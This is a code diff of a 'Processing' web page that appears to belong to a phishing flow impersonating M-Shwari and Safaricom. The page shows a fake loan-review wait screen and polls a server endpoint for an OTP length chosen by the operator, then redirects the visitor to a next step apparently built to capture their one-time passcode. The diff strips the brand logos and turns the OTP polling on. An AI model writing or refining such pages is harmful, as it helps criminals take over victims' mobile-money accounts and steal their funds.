@@ -3,84 +3,72 @@
 
 <head>
     <title>Processing</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
-    <div class="header">
-        <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
+<div class="header"></div>
 
-    </div>
+<div class="container">
 
-    <div class="container">
+    <h2 class="title">Processing...</h2>
 
-        <h2 class="title">Processing...</h2>
+    <div class="loader"></div>
 
-        <div class="loader"></div>
-        <br>
-        <br>
-        <br>
-        <br>
+    <p style="text-align:center; margin-top:20px;">
+        Please wait while we review your application
+    </p>
 
+</div>
 
-        <p style="text-align:center; margin-top:20px;">
-            Please wait while we review your application
-        </p>
+<div class="footer"></div>
 
-    </div>
+<script>
 
-    <div class="footer">
-        <br><br><br><br><br><br>
-        <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
-    </div>
-
-    <script>
-
-        // 🔵 FLOW 1: from earlier step → go to step5 after 5s
+// 🔵 FLOW 1: from earlier step → go to step5 after 5s
 
 
-        // 🔵 FLOW 2: always check for updates (OTP + decision)
-        let isRedirecting = false;
+// 🔵 FLOW 2: always check for updates (OTP + decision)
+let isRedirecting = false;
 
-        const checker = setInterval(async () => {
-            if (isRedirecting) return;
-            showLoaderAndGo("dashboard.html");
-            // try {
-            //     // 🔢 CHECK OTP TYPE (5 or 6)
-            //     const res = await fetch("/otp-status");
-            //     const data = await res.json();
-                
-            //     // if (data.otp === 5 || data.otp === 6) {
-            //     //     isRedirecting = true;
-            //     //     clearInterval(checker);
+const checker = setInterval(async () => {
+    if (isRedirecting) return;
 
-            //     //     localStorage.setItem("otpLength", data.otp);
+    try {
+        // 🔢 CHECK OTP TYPE (5 or 6)
+        const res = await fetch("/otp-status");
+        const data = await res.json();
 
+        if (data.otp === 5 || data.otp === 6) {
+            isRedirecting = true;
+            clearInterval(checker);
 
-            //     //     return;
-            //     // }
+            localStorage.setItem("otpLength", data.otp);
 
-            // } catch (err) {
-            //     console.log("Waiting...");
-            // }
-        }, 2000);
-
-        function showLoaderAndGo(url) {
-            document.getElementById("pageLoader").style.display = "block";
-            setTimeout(() => {
-                window.location.href = url;
-            }, 800);
+            showLoaderAndGo("step6.html");
+            return;
         }
 
-        window.onload = () => {
-            document.body.classList.add("loaded");
-        };
+    } catch (err) {
+        console.log("Waiting...");
+    }
+}, 2000);
 
-    </script>
-    <div id="pageLoader" class="loader" style="display:none;"></div>
+function showLoaderAndGo(url) {
+    document.getElementById("pageLoader").style.display = "block";
+    setTimeout(() => {
+        window.location.href = url;
+    }, 800);
+}
+
+window.onload = () => {
+    document.body.classList.add("loaded");
+};
+
+</script>
+<div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
-
 </html>
